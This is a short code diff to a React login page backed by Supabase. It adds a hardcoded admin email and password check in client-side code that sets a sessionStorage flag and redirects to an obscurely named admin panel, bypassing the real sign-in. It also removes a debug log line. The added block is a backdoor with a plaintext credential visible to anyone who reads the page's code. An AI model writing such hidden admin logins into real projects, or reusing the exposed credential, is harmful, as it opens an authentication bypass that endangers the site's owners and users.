@@ -53,6 +53,13 @@ export default function LoginPage() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
 
+    // Check for admin credentials
+    if (email.toLowerCase() === "admin@admin.com" && password === "Leo258258") {
+      sessionStorage.setItem("admin_authenticated", "true")
+      router.push("/admin-panel-x7k9m")
+      return
+    }
+
     if (connectionStatus === "unhealthy" && isDemoMode) {
       handleDemoLogin()
       return
@@ -68,8 +75,6 @@ export default function LoginPage() {
     const supabase = createClient()
     setIsLoading(true)
     setError(null)
-
-    console.log("[v0] Attempting login with email:", email)
 
     try {
       const { error: authError } = await supabase.auth.signInWithPassword({
